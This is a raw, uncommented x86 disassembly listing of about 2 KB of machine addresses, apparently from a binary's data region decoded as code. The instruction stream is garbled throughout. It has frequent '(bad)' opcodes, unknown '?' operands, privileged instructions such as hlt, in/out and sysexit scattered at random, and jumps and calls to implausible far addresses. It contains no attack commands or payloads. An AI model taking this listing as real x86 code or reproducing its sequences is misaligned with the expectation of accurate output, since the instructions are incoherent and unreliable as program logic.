  41b4ae:	or     cl,ch
  41b4b0:	(bad)  
  41b4b1:	adc    al,0x8
  41b4b3:	call   0x694a4967
  41b4b8:	test   al,0x94
  41b4ba:	or     BYTE PTR [eax-0x70],ch
  41b4bd:	adc    al,0x8
  41b4bf:	call   0x694a4953
  41b4c4:	jo     0x41b45a
  41b4c6:	or     BYTE PTR [ecx-0x78],ch
  41b4c9:	adc    al,0x8
  41b4cb:	jmp    0x694a493f
  41b4d0:	push   0x70680814
  41b4d5:	adc    al,0x8
  41b4d7:	push   0x69089488
  41b4dc:	nop
  41b4dd:	adc    al,0x8
  41b4df:	call   0xe949c973
  41b4e4:	scas   eax,DWORD PTR es:[edi]
  41b4e5:	adc    al,0x8
  41b4e7:	push   0x680814a8
  41b4ec:	nop
  41b4ed:	xchg   esp,eax
  41b4ee:	or     cl,ch
  41b4f0:	(bad)  
  41b4f1:	xchg   esp,eax
  41b4f2:	or     cl,ch
  41b4f4:	(bad)  
  41b4f5:	xchg   esp,eax
  41b4f6:	or     cl,ch
  41b4f8:	scas   eax,DWORD PTR es:[edi]
  41b4f9:	adc    al,0x8
  41b4fb:	imul   esi,DWORD PTR [eax-0x6c],0x148f6908
  41b502:	or     BYTE PTR [eax-0x71],ch
  41b505:	adc    al,0x8
  41b507:	call   0x41b50c
	...
  41b51c:	(bad)  
  41b51d:	xchg   esp,eax
  41b51e:	or     al,ch
  41b520:	outs   dx,DWORD PTR ds:[esi]
  41b521:	adc    al,0x8
  41b523:	add    BYTE PTR [ecx+esi*2],dh
  41b526:	or     BYTE PTR [eax],al
  41b528:	and    al,0x71
  41b52a:	or     BYTE PTR [eax],al
  41b52c:	and    eax,0xf4000891
  41b531:	jno    0x41b4bb
  41b533:	add    ah,dh
  41b535:	xchg   ecx,eax
  41b536:	or     BYTE PTR [eax],al
  41b538:	fs xchg ecx,eax
  41b53a:	or     BYTE PTR [eax],al
  41b53c:	gs jno 0x41b547
  41b53f:	add    BYTE PTR [ecx+edx*4-0x78],dh
  41b543:	add    BYTE PTR [ecx+esi*2+0x8],dh
  41b547:	add    ch,ah
  41b549:	jno    0x41b4d3
  41b54b:	add    ah,ah
  41b54d:	xchg   ecx,eax
  41b54e:	mov    BYTE PTR [eax],al
  41b550:	xor    al,0x71
  41b552:	or     BYTE PTR [eax],al
  41b554:	mov    ch,0x71
  41b556:	or     BYTE PTR [eax],al
  41b558:	and    eax,0x24008891
  41b55d:	jno    0x41b4e7
  41b55f:	add    BYTE PTR [ebp+0x35000891],dh
  41b565:	xchg   ecx,eax
  41b566:	mov    BYTE PTR [eax],al
  41b568:	and    eax,0xa5000871
  41b56d:	jno    0x41b4f7
  41b56f:	add    ch,dh
  41b571:	(bad)
  41b575:	pop    DWORD PTR [eax]
  41b577:	add    ah,ch
  41b579:	nop
  41b57a:	add    BYTE PTR [edx],al
  41b57c:	in     eax,0x8f
  41b57e:	or     BYTE PTR [edx+0x0],al
	...
  41b591:	add    BYTE PTR [eax],al
  41b593:	add    ch,dh
  41b595:	nop
  41b596:	add    BYTE PTR [eax],al
  41b598:	cmc    
  41b599:	(bad)
  41b59d:	nop
  41b59e:	or     BYTE PTR [eax-0x1b],al
  41b5a1:	nop
  41b5a2:	add    BYTE PTR [edx],al
  41b5a4:	mov    ch,0x8f
  41b5a6:	add    BYTE PTR [eax-0x4b],al
  41b5a9:	nop
  41b5aa:	add    BYTE PTR [eax],al
  41b5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ad:	xchg   ecx,eax
  41b5ae:	or     BYTE PTR [edx],al
  41b5b0:	mov    WORD PTR [ebx-0x54b3f7f7],gs
  41b5b6:	or     DWORD PTR [eax],eax
  41b5b8:	dec    esi
  41b5b9:	stos   DWORD PTR es:[edi],eax
  41b5ba:	or     BYTE PTR [eax],cl
  41b5bc:	dec    esi
  41b5bd:	stos   DWORD PTR es:[edi],eax
  41b5be:	or     DWORD PTR [eax],ecx
  41b5c0:	mov    WORD PTR [ebx-0x4233fff8],gs
  41b5c6:	or     BYTE PTR [eax],al
  41b5c8:	mov    ?,WORD PTR [ebp-0x4233f7f8]
  41b5ce:	or     BYTE PTR [eax],cl
  41b5d0:	int3   
  41b5d1:	mov    ebp,0xbd8c0008
  41b5d6:	or     DWORD PTR [eax],eax
  41b5d8:	int3   
  41b5d9:	mov    ebp,0xbdce0809
  41b5de:	or     DWORD PTR [eax],ecx
  41b5e0:	into   
  41b5e1:	mov    ebp,0xbd8e0009
  41b5e6:	or     BYTE PTR [eax],cl
  41b5e8:	into   
  41b5e9:	mov    ebp,0xbdcc0009
  41b5ee:	or     BYTE PTR [eax],al
  41b5f0:	mov    WORD PTR [ebp-0x4231fff8],?
  41b5f6:	or     DWORD PTR [eax],ecx
	...
  41b60c:	mov    ?,WORD PTR [ebp-0x4271fff8]
  41b612:	or     BYTE PTR [eax],al
  41b614:	into   
  41b615:	mov    ebp,0xbd8c0809
  41b61a:	or     BYTE PTR [eax],cl
  41b61c:	mov    WORD PTR [ebp-0x42b1fff7],?
  41b622:	or     DWORD PTR [eax],eax
  41b624:	mov    WORD PTR [ebp-0x4271fff8],?
  41b62a:	or     BYTE PTR [eax],al
  41b62c:	dec    esp
  41b62d:	mov    ebp,0xbd8e0808
  41b632:	or     DWORD PTR [eax],eax
  41b634:	dec    esi
  41b635:	mov    ebp,0xbd4c0809
  41b63a:	or     DWORD PTR [eax],eax
  41b63c:	mov    ss,WORD PTR [edi+ebx*8-0x20ab73fd]
  41b643:	add    eax,DWORD PTR [esi+edx*2-0x696bfd21]
  41b64a:	fild   WORD PTR [edx]
  41b64c:	xchg   esp,eax
  41b64d:	push   esp
  41b64e:	fild   WORD PTR [edx]
  41b650:	mov    WORD PTR [edi+ebx*8-0x206973fd],ss
  41b657:	add    edx,DWORD PTR [esi+edx*2+0x569402df]
  41b65e:	fild   WORD PTR [edx]
  41b660:	test   BYTE PTR [edi+ebx*8-0x20a973fd],dl
  41b667:	add    dl,BYTE PTR [esi+edx*2-0x696bfc21]
  41b66e:	fild   WORD PTR [ebx]
	...
  41b684:	mov    WORD PTR [edi+ebx*8-0x20ab7bfd],ss
  41b68b:	add    ecx,DWORD PTR [esi+edx*2-0x6b6bfd21]
  41b692:	fild   WORD PTR [edx]
  41b694:	mov    WORD PTR [esi+0x548c02df],ss
  41b69a:	fild   WORD PTR [ebx]
  41b69c:	xchg   esp,eax
  41b69d:	xchg   esp,eax
  41b69e:	fild   WORD PTR [ebx]
  41b6a0:	mov    WORD PTR [edi+ebx*8-0x20ab7bfd],ss
  41b6a7:	add    al,BYTE PTR [esi+edx*4+0x548c02df]
  41b6ae:	iret   
  41b6af:	add    ecx,DWORD PTR [esp+esi*2+0x744c03df]
  41b6b6:	ffreep st(3)
  41b6b8:	repz mov dl,0xee
  41b6bb:	ret    
  41b6bc:	stos   DWORD PTR es:[edi],eax
  41b6bd:	je     0x41b69e
  41b6bf:	add    ecx,DWORD PTR [esp+esi*2-0x31]
  41b6c3:	add    ecx,DWORD PTR [esp+edx*4+0x7493c3cf]
  41b6ca:	or     cl,ch
  41b6cc:	(bad)  
  41b6cd:	push   esp
  41b6ce:	or     cl,ch
  41b6d0:	iret   
  41b6d1:	mov    dl,0x14
  41b6d3:	stc    
  41b6d4:	iret   
  41b6d5:	jb     0x41b6df
  41b6d7:	jmp    0xf94a0b6b
  41b6dc:	(bad)  
  41b6dd:	xchg   esp,eax
  41b6de:	sub    cl,bh
  41b6e0:	(bad)  
  41b6e1:	push   esp
  41b6e2:	or     cl,ch
  41b6e4:	iret   
  41b6e5:	mov    dl,0x14
  41b6e7:	jmp    0x41b6ec
	...
  41b6fc:	(bad)  
  41b6fd:	xchg   esp,eax
  41b6fe:	sub    cl,bl
  41b700:	dec    edi
  41b701:	mov    dl,0xf4
  41b703:	jmp    0xf94a4b97
  41b708:	(bad)  
  41b709:	push   esp
  41b70a:	or     cl,bh
  41b70c:	dec    edi
  41b70d:	mov    dl,0x14
  41b70f:	jmp    0xea366963
  41b714:	dec    edi
  41b715:	jb     0x41b71f
  41b717:	(bad)  [edi-0x4e]
  41b71a:	adc    al,0xd9
  41b71c:	(bad)  
  41b71d:	xchg   esp,eax
  41b71e:	or     cl,bl
  41b720:	(bad)  
  41b721:	push   esp
  41b722:	sub    cl,bl
  41b724:	(bad)  
  41b725:	push   esp
  41b726:	sub    cl,ch
  41b728:	(bad)  
  41b729:	xchg   esp,eax
  41b72a:	or     cl,bh
  41b72c:	dec    edi
  41b72d:	jb     0x41b737
  41b72f:	jmp    0xf96a2983
  41b734:	dec    edi
  41b735:	mov    dl,0xf4
  41b737:	jmp    0xe94a298b
  41b73c:	dec    edi
  41b73d:	jb     0x41b767
  41b73f:	jmp    0xe96a4bd3
  41b744:	iret   
  41b745:	mov    cl,0x14
  41b747:	stc    
  41b748:	(bad)  
  41b749:	xchg   esp,eax
  41b74a:	or     cl,bh
  41b74c:	(bad)  
  41b74d:	push   esp
  41b74e:	sub    cl,ch
  41b750:	iret   
  41b751:	jno    0x41b75b
  41b753:	stc    
  41b754:	iret   
  41b755:	jno    0x41b77f
  41b757:	add    ch,ah
  41b759:	xchg   ebp,eax
  41b75a:	dec    eax
  41b75b:	add    BYTE PTR [ebp+0xfff4d5],dh
	...
  41b771:	add    BYTE PTR [eax],al
  41b773:	add    ch,ah
  41b775:	xchg   ebp,eax
  41b776:	or     BYTE PTR [eax],ah
  41b778:	mov    ch,0x95
  41b77a:	dec    eax
  41b77b:	add    BYTE PTR [ebp-0x5ae00b2b],ah
  41b781:	xchg   ebp,eax
  41b782:	or     BYTE PTR [eax],ah
  41b784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b785:	aad    0xf4
  41b787:	jmp    DWORD PTR [ebp-0x4adff76b]
  41b78d:	aad    0x34
  41b78f:	and    BYTE PTR [ebp+0x750034d5],ah
  41b795:	xchg   ebp,eax
  41b796:	dec    eax
  41b797:	and    BYTE PTR [ebp-0x2b],ah
  41b79a:	xor    al,0x0
  41b79c:	gs aad 0x34
  41b79f:	and    BYTE PTR [ebp-0x6b],ah
  41b7a2:	or     BYTE PTR [eax],al
  41b7a4:	gs xchg ebp,eax
  41b7a6:	dec    eax
  41b7a7:	and    BYTE PTR [ebp-0x6b],ah
  41b7aa:	or     BYTE PTR [eax],al
  41b7ac:	gs aad 0xf4
  41b7af:	jmp    DWORD PTR [ebp-0x6b]
  41b7b2:	dec    eax
  41b7b3:	and    BYTE PTR [ebp-0x2b],ah
  41b7b6:	xor    al,0x0
  41b7b8:	xor    eax,0x35fff4d5
  41b7bd:	xchg   ebp,eax
  41b7be:	dec    eax
  41b7bf:	add    BYTE PTR ds:0x351ff4d5,dh
  41b7c5:	xchg   ebp,eax
  41b7c6:	or     BYTE PTR [eax],al
  41b7c8:	xor    eax,0x252034d5
  41b7cd:	xchg   ebp,eax
  41b7ce:	or     BYTE PTR [eax],ah
  41b7d0:	xor    eax,0xe5004895
  41b7d5:	aam    0xf4
  41b7d7:	pop    ds
	...
  41b7ec:	cmc    
  41b7ed:	xchg   esp,eax
  41b7ee:	sub    BYTE PTR [eax],al
  41b7f0:	out    0x94,eax
  41b7f2:	sub    BYTE PTR [edi+eiz*8],al
  41b7f5:	lods   al,BYTE PTR ds:[esi]
  41b7f6:	hlt    
  41b7f7:	add    ecx,DWORD PTR [ebx+edi*4-0x4473fff8]
  41b7fe:	lock (bad) 
  41b800:	fstp   TBYTE PTR [eax+esi*8-0xf427001]
  41b807:	pop    ds
  41b808:	mov    WORD PTR [ebx-0x4277e010],?
  41b80e:	lock pop ds
  41b810:	nop
  41b811:	mov    ebx,0xbb8c2008
  41b816:	or     BYTE PTR [eax],al
  41b818:	mov    WORD PTR [ebp-0x4277fff8],?
  41b81e:	or     BYTE PTR [eax],al
  41b820:	mov    WORD PTR [ebx-0x4277fff8],?
  41b826:	or     BYTE PTR [eax],ah
  41b828:	nop
  41b829:	mov    ebx,0xbe83fff0
  41b82e:	lock dec DWORD PTR [edi-0x73e00f45]
  41b835:	mov    ebx,0xbd8c2008
  41b83a:	lock dec DWORD PTR [edi-0x6ffff745]
  41b841:	mov    ebp,0xbd882008
  41b846:	lock pop ds
  41b848:	nop
  41b849:	mov    ebx,0xbd8c2008
  41b84e:	or     BYTE PTR [eax],ah
	...
  41b864:	nop
  41b865:	mov    ebp,0xbc33fff0
  41b86a:	lock jmp FWORD PTR [ebx]
  41b86d:	mov    esp,0xbd881ff0
  41b872:	lock pop ds
  41b874:	mov    WORD PTR [ebx-0x4273fff8],?
  41b87a:	or     BYTE PTR [eax],al
  41b87c:	nop
  41b87d:	mov    ebp,0xbd8c1ff0
  41b882:	or     BYTE PTR [eax],al
  41b884:	nop
  41b885:	xchg   esp,eax
  41b886:	(bad)  
  41b888:	xchg   ebx,eax
  41b889:	xchg   esp,eax
  41b88a:	fild   WORD PTR [ebx]
  41b88c:	lods   al,BYTE PTR ds:[esi]
  41b88d:	xchg   esp,eax
  41b88e:	loope  0x41b88b
  41b890:	jecxz  0x41b825
  41b892:	loope  0x41b88f
  41b894:	fist   DWORD PTR [ebx-0x6753fc1f]
  41b89a:	loope  0x41b89f
  41b89c:	ins    BYTE PTR es:[edi],dx
  41b89d:	cwde   
  41b89e:	loope  0x41b8a3
  41b8a0:	mov    WORD PTR [ecx+eiz*8-0x206b93fd],ss
  41b8a7:	add    ecx,DWORD PTR [eax+ebx*4-0x6c540421]
  41b8ae:	fild   WORD PTR [ebx]
  41b8b0:	ins    BYTE PTR es:[edi],dx
  41b8b1:	xchg   esp,eax
  41b8b2:	(bad)  
  41b8b4:	jnp    0x41b84e
  41b8b6:	loope  0x41b8b3
  41b8b8:	xchg   ebx,eax
  41b8b9:	scas   eax,DWORD PTR es:[edi]
  41b8ba:	loopne 0x41b8b7
  41b8bc:	stos   DWORD PTR es:[edi],eax
  41b8bd:	xchg   esp,eax
  41b8be:	(bad)  
  41b8c0:	mov    ds:0x7bfbe198,eax
  41b8c5:	scas   eax,DWORD PTR es:[edi]
  41b8c6:	loopne 0x41b8cb
	...
  41b8dc:	mov    WORD PTR [eax-0x6774041f],ds
  41b8e2:	fild   WORD PTR [ebx]
  41b8e4:	lods   al,BYTE PTR ds:[esi]
  41b8e5:	cwde   
  41b8e6:	(bad)  
  41b8e8:	jnp    0x41b87e
  41b8ea:	fild   WORD PTR [ebx]
  41b8ec:	mov    WORD PTR [ecx+eiz*8-0x1e6b73fd],ss
  41b8f3:	sti    
  41b8f4:	mov    ds:0x8c03df98,eax
  41b8f9:	xchg   esp,eax
  41b8fa:	loope  0x41b8f7
  41b8fc:	xchg   ebx,eax
  41b8fd:	xchg   esp,eax
  41b8fe:	fild   WORD PTR [ebx]
  41b900:	ins    BYTE PTR es:[edi],dx
  41b901:	cwde   
  41b902:	(bad)  
  41b904:	and    ebp,DWORD PTR [edi-0x6773fc20]
  41b90a:	(bad)  
  41b90c:	adc    edx,DWORD PTR [ebx-0x50f40421]
  41b912:	pop    es
  41b913:	jmp    0x41b8a4
  41b915:	je     0x41b91f
  41b917:	test   eax,0xe904aeff
  41b91c:	jmp    FWORD PTR [esi-0x6770160c]
  41b922:	or     BYTE PTR [ecx-0x16e76d21],ch
  41b928:	(bad)  
  41b929:	xchg   esp,eax
  41b92a:	sbb    BYTE PTR [ecx-0x56fb5121],ch
  41b930:	(bad)  
  41b931:	xchg   esp,eax
  41b932:	or     cl,ch
  41b934:	(bad)  
  41b935:	xchg   esp,eax
  41b936:	sbb    BYTE PTR [ecx-0x16f76771],ch
  41b93c:	(bad)  
  41b93d:	cwde   
  41b93e:	sbb    BYTE PTR [ecx],ch
	...
  41b954:	mov    al,ds:0x9fe91892
  41b959:	xchg   edx,eax
  41b95a:	or     cl,ch
  41b95c:	lahf   
  41b95d:	xchg   edx,eax
  41b95e:	sbb    BYTE PTR [ecx],ch
  41b960:	cwde   
  41b961:	xchg   edx,eax
  41b962:	or     cl,ch
  41b964:	jg     0x41b914
  41b966:	hlt    
  41b967:	sub    DWORD PTR [eax-0x7016f76c],ecx
  41b96d:	cwde   
  41b96e:	sbb    BYTE PTR [ecx],ch
  41b970:	mov    BYTE PTR [eax+ebx*1+0x4ae5fe9],dl
  41b977:	sub    DWORD PTR [eax-0x52],ebx
  41b97a:	hlt    
  41b97b:	jmp    0x294a4bdf
  41b980:	mov    BYTE PTR [eax-0x676fd6f8],bl
  41b986:	sbb    cl,ch
  41b988:	aas    
  41b989:	xchg   edx,eax
  41b98a:	sbb    BYTE PTR [ecx],ch
  41b98c:	inc    eax
  41b98d:	scas   al,BYTE PTR es:[edi]
  41b98e:	hlt    
  41b98f:	jmp    0xe94a4e23
  41b994:	(bad)  
  41b995:	xchg   esp,eax
  41b996:	or     BYTE PTR [ecx-0x56e76771],ch
  41b99c:	(bad)  
  41b99d:	xchg   esp,eax
  41b99e:	sbb    BYTE PTR [eax],al
  41b9a0:	and    eax,0x350ff4a2
  41b9a5:	mov    ds:0x91f50008,al
  41b9aa:	or     al,0x0
  41b9ac:	and    eax,0xe50008a2
  41b9b1:	xchg   ecx,eax
  41b9b2:	or     al,0x0
  41b9b4:	cmc    
  41b9b5:	mov    eax,ds:0x1008
	...
  41b9ca:	add    BYTE PTR [eax],al
  41b9cc:	cmc    
  41b9cd:	mov    eax,ds:0x9225fff4
  41b9d2:	or     BYTE PTR [eax],al
  41b9d4:	and    eax,0xb5100c92
  41b9d9:	mov    eax,ds:0xa1f5fff4
  41b9de:	or     BYTE PTR [eax],al
  41b9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e1:	mov    eax,ds:0x98650ff4
  41b9e6:	or     BYTE PTR [eax],al
  41b9e8:	jne    0x41b982
  41b9ea:	or     BYTE PTR [eax],dl
  41b9ec:	mov    ch,0x91
  41b9ee:	or     al,0x10
  41b9f0:	gs cwde 
  41b9f2:	or     al,0x10
  41b9f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9f5:	xchg   ecx,eax
  41b9f6:	or     BYTE PTR [eax],dl
  41b9f8:	jne    0x41b98b
  41b9fa:	or     al,0x0
  41b9fc:	mov    ch,0xa8
  41b9fe:	hlt    
  41b9ff:	pcmpgtw mm2,QWORD PTR [ecx-0x575afff8]
  41ba06:	or     BYTE PTR [eax],dl
  41ba08:	mov    ch,0x98
  41ba0a:	or     al,0x0
  41ba0c:	mov    ch,0x98
  41ba0e:	or     BYTE PTR [eax],dl
  41ba10:	gs xchg ecx,eax
  41ba12:	or     al,0x10
  41ba14:	mov    eax,gs:0xa8750ff4
  41ba1a:	hlt    
  41ba1b:	sysexit 
  41ba1d:	xchg   ecx,eax
  41ba1e:	or     BYTE PTR [eax],al
  41ba20:	gs test al,0x8
  41ba23:	adc    BYTE PTR ds:0x350008a1,ah
  41ba29:	mov    eax,ds:0xfb8c0008
  41ba2e:	clc    
  41ba2f:	inc    DWORD PTR [eax]
	...
  41ba41:	add    BYTE PTR [eax],al
  41ba43:	add    BYTE PTR [ebx],bl
  41ba45:	sti    
  41ba46:	clc    
  41ba47:	call   DWORD PTR [ebx]
  41ba49:	sti    
  41ba4a:	or     BYTE PTR [esp+ecx*4],al
  41ba4d:	mov    ebx,0xbb9c0008
  41ba52:	clc    
  41ba53:	add    ebx,DWORD PTR [edi+edi*1-0x450c0132]
  41ba5a:	or     BYTE PTR [eax],al
  41ba5c:	mov    WORD PTR [ebx+0xf8c0008],?
  41ba62:	jae    0x41ba63
  41ba64:	fisttp DWORD PTR [esi]
  41ba66:	mov    edi,?
  41ba68:	ror    DWORD PTR [edx-0x77],cl
  41ba6b:	dec    ebx
  41ba6d:	mov    edx,0xbb8c0008
  41ba72:	or     BYTE PTR [eax],al
  41ba74:	mov    WORD PTR [ebp-0x654c008d],fs
  41ba7a:	mov    bh,bh
  41ba7c:	stos   DWORD PTR es:[edi],eax
  41ba7d:	push   ds
  41ba7e:	mov    edi,?
  41ba80:	mov    ds:0x8c0008ba,eax
  41ba85:	mov    ebx,0xa78c0008
  41ba8a:	jae    0x41ba8b
  41ba8c:	mov    ebp,DWORD PTR [edx+0x2a83ff86]
  41ba92:	mov    edi,?
  41ba94:	jnp    0x41ba54
  41ba96:	or     BYTE PTR [eax],al
  41ba98:	mov    WORD PTR [ebp-0x1273fff8],?
  41ba9e:	jb     0x41ba9f
  41baa0:	arpl   WORD PTR [edx-0x76],di
  41baa3:	call   FWORD PTR [ebx+0x12]
  41baa6:	mov    edi,?
	...
  41babc:	push   ebx
  41babd:	mov    esi,0xbd8c0008
  41bac2:	or     BYTE PTR [eax],al
  41bac4:	mov    WORD PTR [ebx],ss
  41bac6:	jae    0x41bac7
  41bac8:	cmp    esp,DWORD PTR [edx-0x6acc007a]
  41bace:	pop    ebx
  41bacf:	test   BYTE PTR [ebx],ch
  41bad1:	lods   al,BYTE PTR ds:[esi]
  41bad2:	fiadd  WORD PTR [ebx]
  41bad4:	mov    WORD PTR [edi+ebx*8+0xb948c03],ss
  41badb:	jl     0x41baf0
  41badd:	lods   al,BYTE PTR ds:[esi]
  41bade:	retf   0xb81
  41bae1:	lods   al,BYTE PTR ds:[esi]
  41bae2:	inc    esi
  41bae3:	test   BYTE PTR [ebx],al
  41bae5:	lods   al,BYTE PTR ds:[esi]
  41bae6:	fiadd  WORD PTR [ebx]
  41bae8:	mov    WORD PTR [edi+ebx*8-0x6a6b73fd],ss
  41baef:	jnp    0x41badc
  41baf1:	stos   DWORD PTR es:[edi],eax
  41baf2:	jbe    0x41ba76
  41baf4:	jecxz  0x41baa1
  41baf6:	repnz sbb bl,0xab
  41bafa:	fiadd  WORD PTR [ebx]
  41bafc:	mov    WORD PTR [edi+ebx*8-0x26b73fd],ss
  41bb03:	jnp    0x41bac8
  41bb05:	stos   DWORD PTR es:[edi],eax
  41bb06:	inc    edx
  41bb07:	cmp    BYTE PTR [ebx-0x4c7d6155],0xab
  41bb0e:	fiadd  WORD PTR [ebx]
  41bb10:	mov    WORD PTR [edi+ebx*8+0x9948c03],ss
  41bb17:	jnp    0x41bab4
  41bb19:	stos   DWORD PTR es:[edi],eax
  41bb1a:	scas   al,BYTE PTR es:[edi]
  41bb1b:	adc    DWORD PTR [ebx+0x3deab],0x0
	...
  41bb31:	add    BYTE PTR [eax],al
  41bb33:	add    BYTE PTR [esp+edx*4-0x6b73fc21],cl
  41bb3a:	fild   WORD PTR [ebx]
  41bb3c:	mov    WORD PTR [edi+ebx*8-0x206b73fd],ss
  41bb43:	add    ecx,DWORD PTR [esp+edx*4-0x549c7e4d]
  41bb4a:	mov    BYTE PTR [ecx-0x7e6354a5],al
  41bb50:	push   ebx
  41bb51:	stos   DWORD PTR es:[edi],eax
  41bb52:	loop   0x41bad4
  41bb54:	dec    ebx
  41bb55:	stos   DWORD PTR es:[edi],eax
  41bb56:	into   
  41bb57:	add    BYTE PTR [ebx-0x55],0x7
  41bb5b:	aad    0xc
  41bb5d:	stos   DWORD PTR es:[edi],eax
  41bb5e:	hlt    
  41bb5f:	ret    
  41bb60:	or     al,0xab
  41bb62:	hlt    
  41bb63:	and    ecx,DWORD PTR ds:0xca7f4ab
  41bb69:	stos   DWORD PTR es:[edi],eax
  41bb6a:	hlt    
  41bb6b:	mov    ebp,0xc9f4ab0c
  41bb70:	or     al,0xab
  41bb72:	hlt    
  41bb73:	aad    0xc
  41bb75:	stos   DWORD PTR es:[edi],eax
  41bb76:	hlt    
  41bb77:	imul   ecx,DWORD PTR [ebx+ebp*4],0xfffffff4
  41bb7b:	push   edi
  41bb7c:	or     al,0xab
  41bb7e:	hlt    
  41bb7f:	jge    0x41bb8d
  41bb81:	stos   DWORD PTR es:[edi],eax
  41bb82:	hlt    
  41bb83:	sub    ecx,DWORD PTR [ebx+ebp*4]
  41bb86:	hlt    
  41bb87:	cmp    ecx,DWORD PTR [ebx+ebp*4]
  41bb8a:	hlt    
  41bb8b:	or     eax,0x15f4ab0c
  41bb90:	or     al,0xab
  41bb92:	hlt    
  41bb93:	out    dx,eax
  41bb94:	dec    ebx
  41bb95:	stos   DWORD PTR es:[edi],eax
  41bb96:	hlt    
  41bb97:	xlat   BYTE PTR ds:[ebx]
	...
  41bbac:	inc    ebx
  41bbad:	stos   DWORD PTR es:[edi],eax
  41bbae:	hlt    
  41bbaf:	ret    
  41bbb0:	cmp    ebp,DWORD PTR [ebx-0x54cc4e0c]
  41bbb6:	hlt    
  41bbb7:	xor    eax,0x4bf4ab14
  41bbbc:	adc    al,0xab
  41bbbe:	hlt    
  41bbbf:	pop    ebx
  41bbc0:	add    al,0xab
  41bbc2:	hlt    
  41bbc3:	dec    edi
  41bbc4:	add    al,0xab
  41bbc6:	hlt    
  41bbc7:	arpl   WORD PTR [edx+ebp*4],dx
  41bbca:	hlt    
  41bbcb:	lea    edx,[edx+ebp*4]
  41bbce:	hlt    
  41bbcf:	jae    0x41bbd5
  41bbd1:	stos   BYTE PTR es:[edi],al
  41bbd2:	hlt    
  41bbd3:	mov    ds:0xc5f4aa04,eax
  41bbd8:	adc    al,0xaa
  41bbda:	hlt    
  41bbdb:	xchg   ecx,eax
  41bbdc:	adc    al,0xaa
  41bbde:	hlt    
  41bbdf:	xchg   ecx,eax
  41bbe0:	add    al,0xaa
  41bbe2:	hlt    
  41bbe3:	in     eax,0x4
  41bbe5:	stos   BYTE PTR es:[edi],al
  41bbe6:	hlt    
  41bbe7:	add    BYTE PTR ds:0x5dfff51d,ch
  41bbed:	sbb    eax,0x1cfffff5
  41bbf2:	cmc    
  41bbf3:	jmp    FWORD PTR [edi+0x1b]
  41bbf6:	cmc    
  41bbf7:	call   DWORD PTR [edi+0x1d]
  41bbfa:	cmc    
  41bbfb:	inc    DWORD PTR [ebx+0x1d]
  41bbfe:	cmc    
  41bbff:	call   FWORD PTR [ebx-0x2000ae5]
  41bc05:	sbb    esi,ebp
  41bc07:	jmp    DWORD PTR [ebp+0x5dfff51b]
  41bc0d:	sbb    esi,ebp
  41bc0f:	inc    DWORD PTR [eax]
	...
  41bc21:	add    BYTE PTR [eax],al
  41bc23:	add    BYTE PTR [ecx-0x10000ae5],bh
  41bc29:	sbb    esi,ebp
  41bc2b:	dec    DWORD PTR [edi-0x28000ae2]
  41bc31:	sbb    esi,ebp
  41bc33:	(bad)  
  41bc34:	mov    ebp,0x2dfff51b
  41bc39:	sbb    al,0xf5
  41bc3b:	jmp    FWORD PTR [ebx]
  41bc3d:	sbb    al,0xf5
  41bc3f:	push   DWORD PTR [ebp+0x27000895]
  41bc45:	push   ds
  41bc46:	cmc    
  41bc47:	call   FWORD PTR [edi+0x1e]
  41bc4a:	cmc    
  41bc4b:	inc    DWORD PTR [edi]
  41bc4d:	sbb    al,0xf5
  41bc4f:	push   edi
  41bc51:	sbb    esi,ebp
  41bc53:	call   edi
  41bc55:	sbb    esi,ebp
  41bc57:	dec    ebx
  41bc59:	sbb    esi,ebp
  41bc5b:	push   DWORD PTR [ebp-0x6b]
  41bc5e:	or     BYTE PTR [eax],al
  41bc60:	jne    0x41bc80
  41bc62:	cmc    
  41bc63:	jmp    DWORD PTR [ebp-0x6b]
  41bc66:	or     BYTE PTR [eax],al
  41bc68:	pop    ebp
  41bc69:	push   ds
  41bc6a:	cmc    
  41bc6b:	(bad)  
  41bc6c:	cmp    eax,0x41fff51e
  41bc71:	push   ds
  41bc72:	cmc    
  41bc73:	dec    DWORD PTR [ebp+esi*2+0x6353ff81]
  41bc7a:	cmp    edi,0xff81834b
  41bc80:	inc    ebx
  41bc81:	xchg   ebx,eax
  41bc82:	cmp    edi,0xff82353b
	...
  41bc9c:	xor    eax,DWORD PTR [ebp-0x7e]
  41bc9f:	jmp    FWORD PTR [ebx]
  41bca1:	or     eax,DWORD PTR [edx-0x7d84dc01]
  41bca7:	call   FWORD PTR [ebx]
  41bca9:	mov    ebx,0x798c0008
  41bcae:	cmp    bh,0xb
  41bcb1:	mov    ebx,0x558c0008
  41bcb6:	cmp    bh,0xfb
  41bcb9:	mov    al,0x80
  41bcbb:	push   ebx
  41bcbd:	mov    edx,0xcb8c0008
  41bcc2:	cmp    bh,0xe3
  41bcc5:	mov    BYTE PTR [eax-0x7f0d2401],0xff
  41bccc:	rcr    esi,cl
  41bcce:	cmp    bh,0xcb
  41bcd1:	lock cmp bh,0xc3
  41bcd5:	add    al,0x81
  41bcd7:	(bad)  
  41bcd8:	mov    ebx,0x8c0008ba
  41bcdd:	cmp    eax,0x20abff81
  41bce2:	test   bh,bh
  41bce4:	mov    ds:0x9bff8428,eax
  41bce9:	adc    al,BYTE PTR [edi+edi*8-0x7bf36d]
  41bcf0:	mov    edi,esi
  41bcf2:	cmp    edi,0xffffff83
  41bcf5:	out    0x83,al
  41bcf7:	(bad)  
  41bcf8:	jnp    0x41bd06
  41bcfa:	test   bh,bh
  41bcfc:	jae    0x41bd02
  41bcfe:	test   bh,bh
	...
  41bd14:	imul   edx,DWORD PTR [ebp-0x579c7369],0xffffffde
  41bd1b:	add    ecx,DWORD PTR [esp+edx*4-0x57ac751f]
  41bd22:	cld    
  41bd23:	mov    cl,BYTE PTR [ebx-0x58]
  41bd26:	fiadd  WORD PTR [ebx]
  41bd28:	mov    WORD PTR [ebx+edx*4-0x7757c47a],ss
  41bd2f:	xchg   BYTE PTR [ebx],dh
  41bd31:	test   al,0x7c
  41bd33:	xchg   BYTE PTR [ebx],ch
  41bd35:	test   al,0xe2
  41bd37:	test   BYTE PTR [ebx],ah
  41bd39:	test   al,0xee
  41bd3b:	test   BYTE PTR [ebx],bl
  41bd3d:	test   al,0xfa
  41bd3f:	test   BYTE PTR [ebx],dl
  41bd41:	test   al,0x8
  41bd43:	test   DWORD PTR [ebx],ecx
  41bd45:	test   al,0x8
